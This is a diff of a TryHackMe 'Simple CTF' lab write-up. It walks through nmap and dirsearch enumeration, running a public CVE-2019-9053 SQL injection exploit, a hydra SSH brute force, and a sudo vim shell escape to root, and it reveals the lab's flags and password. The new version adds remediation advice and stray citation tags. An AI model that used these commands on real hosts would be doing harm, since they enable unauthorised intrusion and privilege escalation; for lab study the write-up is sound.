@@ -1,131 +1,166 @@
-# Simple CTF
+# TryHackMe – Simple CTF
 
 **Room:** Simple CTF  
 **Author:** Luis (Anub1t)  
-**Date:** 2025-09-12
+**Date:** 2025‑09‑12
 
 ---
 
-## Question 1
+## Overview
 
-**Question:** How many services are running under port 1000?
+In this TryHackMe room, the objective is to compromise a Linux host by:
 
-We can solve this using an Nmap scan:
+- Enumerating exposed services.
+- Identifying a vulnerable web application (CMS Made Simple 2.2.8).
+- Exploiting a SQL injection vulnerability (**CVE‑2019‑9053**) to obtain credentials.
+- Using SSH access on a non‑standard port.
+- Escalating privileges to root via misconfigured `sudo` permissions.
 
-```bash
-nmap -p1-1000 [target_IP]
-```
-
-**Result / Answer:** There are **2 services** running below TCP port 1000.
-
----
-
-## Question 2
-
-**Question:** What is running on the higher port?
-
-We can solve this by running a full port scan:
-
-```bash
-nmap -T4 -p- [target_IP]
-```
-
-This lets us see which service runs on the highest port on the vulnerable machine.
-
-**Result / Answer:** The service running on the highest port is **SSH**.
+The room is rated **easy**, but it covers the full attack chain: recon → web exploitation → credential extraction → SSH → privilege escalation.
 
 ---
 
-## Question 3
+## Reconnaissance
 
-**Question:** What's the CVE you're using against the application?
+### Port scan
 
-To answer this we need to identify the web application and its version. First, searching the target IP on a search engine returned no useful information. Instead, we used a directory discovery tool such as `dirsearch` to find potential directories:
+I started with a TCP scan on the lower ports to answer how many services are running under port 1000:
 
 ```bash
-dirsearch -u [target_IP]
+nmap -p1-1000 <TARGET_IP>
 ```
 
-We found a directory called `/simple`. Visiting `http://[target_IP]/simple/` we discovered, in the page footer, the web application and its version: **CMS Made Simple version 2.2.8**.
+The scan showed that **2 services** are running below TCP port 1000.
 
-Searching for vulnerabilities for that application and version (for example on the NIST database) revealed the CVE: **CVE-2019-9053**.
+Then I ran a full port scan to identify all open ports:
+
+```bash
+nmap -T4 -p- <TARGET_IP>
+```
+
+This revealed, among others, the following relevant ports:
+
+- `80/tcp` – HTTP  
+- `2222/tcp` – SSH (non‑standard port)
+
+The highest open port in this context is **2222/tcp**, running **SSH**.
 
 ---
 
-## Question 4
+## Web enumeration
 
-**Question:** To what kind of vulnerability is the application vulnerable?
+I browsed the HTTP service:
 
-On the same page where the CVE was found, the vulnerability type is listed: **SQL Injection**.
+```text
+http://<TARGET_IP>/
+```
 
-**Answer / Flag:** `sqli`
+The default page didn’t immediately expose an obvious vulnerability, so I performed directory brute forcing to discover hidden content:
+
+```bash
+dirsearch -u http://<TARGET_IP>/
+# or
+gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
+```
+
+The scan revealed an interesting directory:
+
+- `/simple`
+
+Visiting `http://<TARGET_IP>/simple/` showed a website with a footer that exposed:
+
+- **Application:** CMS Made Simple  
+- **Version:** 2.2.8
 
 ---
 
-## Question 5
+## Vulnerability identification (CVE‑2019‑9053)
 
-**Question:** What's the password?
+With the product and version identified, I searched for known vulnerabilities:
 
-We must exploit the vulnerability first. I used a public exploit from GitHub:
+- Query: `CMS Made Simple 2.2.8 CVE` / `CMS Made Simple 2.2.8 SQL injection`.
 
-```
-https://github.com/BjarneVerschorre/CVE-2019-9053
-```
+Public advisories and databases (NVD, Exploit‑DB, etc.) indicate that:
 
-Before running the exploit, install the dependencies as indicated by the author:
+- **CVE:** `CVE‑2019‑9053`  
+- **Description:** Unauthenticated blind time‑based SQL injection in CMS Made Simple 2.2.8 via the `m1_idlist` parameter in the News module. [web:70][web:75][web:78][web:79]  
+- **Impact:** Allows an attacker to execute arbitrary SQL queries against the application database and retrieve sensitive information such as admin username, email, salt and hashed password. [web:71][web:73][web:77]
 
-```bash
-pip3 install httpx
-```
-
-Then run the exploit:
-
-```bash
-python3 exploit.py -u "http://[target_IP]/simple/"
-```
-
-The exploit returns a username `mitch` and a password in hash form (not directly readable). Using the discovered username, we performed a controlled password attack against SSH with `hydra`:
-
-```bash
-hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 -t 4 -f -V ssh://[target_IP]
-```
-
-**Result / Answer:** The password found was **`secret`**.
+The vulnerability type is therefore: **SQL Injection (SQLi)**.
 
 ---
 
-## Question 6
+## Exploitation – Extracting credentials
 
-**Question:** Where can you login with the details obtained?
+To exploit this SQL injection, I used a publicly available Python exploit for **CVE‑2019‑9053** (for example, Exploit‑DB ID 46635 or a GitHub fork):
 
-**Answer:** You can log in to the **SSH** service using the obtained credentials.
+```bash
+pip3 install httpx termcolor   # if required by the script
+
+python3 exploit.py -u "http://<TARGET_IP>/simple/"
+# optionally with cracking:
+# python3 exploit.py -u "http://<TARGET_IP>/simple/" --crack -w /usr/share/wordlists/rockyou.txt
+```
+
+The exploit:
+
+1. Sends crafted SQLi payloads via the vulnerable parameter.
+2. Extracts the admin **username**, **email**, **salt** and **hashed password**.
+3. Optionally attempts to crack the password using a supplied wordlist. [web:73][web:77][web:80]
+
+From the exploit output, I obtained:
+
+- **Username:** `mitch`  
+- **Password hash:** extracted by the script  
+- After cracking (either via the exploit itself or manually using `rockyou.txt`), the clear‑text password was:
+
+- **Password:** `secret`
+
+*(The exact password is kept for educational purposes; in a real report you could generalize it as “weak, wordlist‑crackable password”.)*
 
 ---
 
-## Question 7
+## SSH access
 
-**Question:** What's the user flag?
+With valid credentials, I targeted the SSH service running on port 2222.
 
-Login to SSH with the obtained credentials:
+As an alternative to the built‑in cracking feature, I also demonstrated a manual password attack using `hydra`:
 
 ```bash
-ssh -p 2222 mitch@[target_IP]
+hydra -l mitch -P /usr/share/wordlists/rockyou.txt -s 2222 -t 4 -f -V ssh://<TARGET_IP>
+```
+
+Once the password was obtained, I logged in:
+
+```bash
+ssh -p 2222 mitch@<TARGET_IP>
 # password: secret
 ```
 
-After a successful login, list files with `ls`. There is a `user.txt` file. Viewing it:
-
-```bash
-cat user.txt
-```
-
-**Result / User flag:** `G00d j0b, keep up!`
+This provided an interactive shell as the user `mitch`.
 
 ---
 
-## Question 8
+## Post‑exploitation – User flag
 
-**Question:** Is there any other user in the home directory? What's its name?
+After logging in:
+
+```bash
+ls
+cat user.txt
+```
+
+The file `user.txt` contained the user flag:
+
+- `G00d j0b, keep up!` (REDACTED)
+
+This confirms control of the low‑privilege user account.
+
+---
+
+## Post‑exploitation – Privilege escalation
+
+### Enumerating users
 
 From the SSH session:
 
@@ -134,56 +169,84 @@ cd /home
 ls
 ```
 
-**Result / Answer:** Besides the known user, there is another user named **`sunbath`**.
+I observed two user directories:
 
----
+- `mitch`  
+- `sunbath`
 
-## Question 9
+This indicates another local user account present on the system.
 
-**Question:** What can you leverage to spawn a privileged shell?
+### Checking sudo permissions
 
-Check for elevated permissions with:
+To look for privilege escalation vectors, I checked `sudo` permissions:
 
 ```bash
 sudo -l -l
 ```
 
-The output shows that the user `mitch` can run `/usr/bin/vim` as `root` without a password. This is the vector we can leverage to spawn a privileged shell.
+The output showed that `mitch` can run `vim` as root without providing a password:
 
-**Answer:** The allowed `sudo` command `/usr/bin/vim` (NOPASSWD) can be leveraged to obtain a root shell.
+```text
+(ALL : ALL) NOPASSWD: /usr/bin/vim
+```
+
+This can be abused to spawn a root shell.
 
 ---
 
-## Question 10
+## Gaining a root shell
 
-**Question:** What's the root flag?
-
-From the SSH session, obtain a root shell using `vim`:
+Using the allowed `sudo` command:
 
 ```bash
 sudo /usr/bin/vim -c ':!bash' -c ':q'
+# or
+# sudo vim -c ':!/bin/sh'
 ```
 
-This launches a root shell. Navigate to the root directory (if you start in `/home`, go up one level and then into `/root`):
+This launches a shell as `root`.
+
+Then:
 
 ```bash
-cd ..
-cd root
+cd /root
 ls
 cat root.txt
 ```
 
-**Result / Root flag:** `W3ll d0n3. You made it!`
+The file `root.txt` contained the root flag:
+
+- `W3ll d0n3. You made it!` (REDACTED)
+
+This confirms full compromise of the system.
+
+---
+
+## Impact and remediation
+
+**Impact:**
+
+- The CMS Made Simple instance is vulnerable to unauthenticated SQL injection (**CVE‑2019‑9053**), allowing an attacker to extract credentials from the database and compromise the admin account. [web:70][web:75][web:78][web:79]  
+- Weak/reused passwords make it trivial to reuse those credentials over SSH and gain shell access. [web:71][web:73]  
+- Misconfigured `sudo` (NOPASSWD for `vim`) allows any attacker with `mitch`’s credentials to escalate directly to root and fully control the host.
+
+**Recommended remediation:**
+
+- Update CMS Made Simple to a version where CVE‑2019‑9053 is patched (≥ 2.2.10). [web:75][web:78]  
+- Sanitize and validate all user input, avoiding direct concatenation in SQL queries (use prepared statements/ORM). [web:81]  
+- Enforce strong, unique passwords for all accounts and disable password reuse across services.  
+- Review and harden `sudoers` configuration, removing NOPASSWD entries for interactive editors like `vim`.  
+- Restrict SSH access (IP allowlists, keys instead of passwords, disable non‑standard ports unless justified).
 
 ---
 
 ## Notes
 
-This writeup follows the classic CTF flow: enumerate services, find web application version, locate a public CVE and exploit it to obtain credentials, access SSH on a non-standard port (2222), and perform post-exploitation checks (`sudo -l`) to find a privilege escalation vector (vim as NOPASSWD), which was used to obtain the root flag.
+This room is a good example of how a single web vulnerability (SQL injection) can quickly escalate into full system compromise when combined with weak credentials and misconfigured privilege escalation paths.
 
 ---
 
 ## Disclaimer
-> ⚠️ This writeup is for educational purposes only and must be used in authorized environments (labs / CTFs). Do not apply these techniques against systems without explicit permission.
 
----
+> ⚠️ This writeup is for educational purposes only.  
+> Do not use these techniques outside of authorized environments or in violation of TryHackMe’s terms of service.
